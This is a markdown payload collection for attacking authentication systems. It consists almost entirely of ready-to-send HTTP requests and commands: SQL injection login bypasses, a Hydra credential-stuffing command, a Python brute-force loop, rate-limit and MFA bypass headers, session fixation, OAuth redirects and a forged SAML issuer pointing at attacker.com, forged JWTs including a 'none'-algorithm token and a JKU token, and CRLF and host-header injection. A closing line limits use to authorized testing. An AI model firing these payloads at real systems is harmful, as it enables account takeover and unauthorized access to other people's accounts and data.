# Complete Authentication Testing Payloads

This document contains comprehensive authentication testing payloads for identifying vulnerabilities in login systems, session management, and access control mechanisms.

## Table of Contents
1. [Basic Authentication Attacks](#basic-authentication-attacks)
2. [Credential Stuffing](#credential-stuffing)
3. [Brute Force Attacks](#brute-force-attacks)
4. [Password Policy Bypass](#password-policy-bypass)
5. [Session Management](#session-management)
6. [Multi-Factor Authentication Bypass](#multi-factor-authentication-bypass)
7. [OAuth/SSO Vulnerabilities](#oauthsso-vulnerabilities)
8. [API Authentication](#api-authentication)
9. [JWT Attacks](#jwt-attacks)
10. [Advanced Techniques](#advanced-techniques)

---

## Basic Authentication Attacks

### Default Credentials
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin
```

### Common Credentials
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"administrator","password":"P@ssw0rd"}
```

### SQL Injection in Login
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything
```

### HTTP Basic Auth
```http
GET /protected HTTP/1.1
Host: target.com
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
```

---

## Credential Stuffing

### Wordlist Attack
```bash
# Hydra example
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

### Password Spraying
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/json

[
  {"username":"user1","password":"Spring2024!"},
  {"username":"user2","password":"Spring2024!"},
  {"username":"user3","password":"Spring2024!"}
]
```

---

## Brute Force Attacks

### Simple Brute Force
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=known_user&password=123456
```

### Incremental Brute Force
```python
# Python example
import requests
for i in range(1000, 9999):
    response = requests.post('https://target.com/login', data={
        'username': 'known_user',
        'password': str(i)
    })
    if "Welcome" in response.text:
        print(f"Found password: {i}")
        break
```

### Rate Limit Bypass
```http
POST /login HTTP/1.1
Host: target.com
X-Forwarded-For: 1.1.1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=guess1
```

---

## Password Policy Bypass

### Password Truncation
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=longpasswordxxxxxxxxxxxxxxxx[truncated]
```

### Case-Insensitive
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=P@SSword
```

### Special Character Bypass
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=password' or '1'='1
```

---

## Session Management

### Session Fixation
```http
GET /login HTTP/1.1
Host: target.com
Cookie: SESSIONID=attacker_session
```

### Session Timeout Test
```http
GET /dashboard HTTP/1.1
Host: target.com
Cookie: SESSIONID=stale_session; expires=Wed, 01 Jan 2025 00:00:00 GMT
```

### Cookie Manipulation
```http
GET /admin HTTP/1.1
Host: target.com
Cookie: role=admin; user=attacker
```

---

## Multi-Factor Authentication Bypass

### Code Brute Force
```http
POST /verify-2fa HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

code=0000
```

### Response Manipulation
```
http
POST /verify-2fa HTTP/1.1
Host: target.com
Content-Type: application/json

{"status":"success","verified":true}
```

### MFA Bypass Header
```
http
GET /dashboard HTTP/1.1
Host: target.com
X-Forwarded-For: internal_ip
X-MFA-Bypass: true
```

---

## OAuth/SSO Vulnerabilities

### Open Redirect
```
http
GET /oauth/authorize?response_type=code&client_id=client&redirect_uri=https://attacker.com HTTP/1.1
Host: target.com
```

### Token Theft
```http
GET /callback#access_token=ATTACKER_TOKEN&token_type=Bearer HTTP/1.1
Host: attacker.com
```

### IdP Confusion
```http
POST /saml/acs HTTP/1.1
Host: target.com
Content-Type: application/xml

<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_[RANDOM]" IssueInstant="[TIME]" Version="2.0">
  <saml:Issuer>https://attacker.com</saml:Issuer>
  [...malicious claims...]
</saml:Assertion>
```

---

## API Authentication

### Missing Authentication
```http
GET /api/v1/users HTTP/1.1
Host: target.com
```

### API Key Leak
```http
GET /api/v1/admin/settings HTTP/1.1
Host: target.com
X-API-Key: 6b8e5f4a-3c2b-1e9d-8f7a-6b5c4d3e2f1a
```

### JWT None Algorithm
```http
GET /api/user/profile HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

---

## JWT Attacks

### Algorithm Switching
```http
GET /api/user HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.wrongsignature
```

### Expired Token
```http
GET /api/user HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE2MDAwMDAwMDB9.old_signature
```

### JKU Exploit
```http
GET /api/user HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2tleXMuanNvbiJ9.evil_payload
```

---

## Advanced Techniques

### Web Cache Poisoning
```http
GET /login?callback=attacker_js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

### Host Header Injection
```http
POST /login HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Referer: https://target.com

username=admin&password=admin
```

### CRLF Injection
```http
GET /login?url=https://target.com/%0D%0ASet-Cookie:%20SESSIONID=attacker_session HTTP/1.1
Host: target.com
```

Remember to only use these payloads for authorized security testing. Unauthorized testing may violate laws and regulations. Always obtain proper permission before conducting security assessments.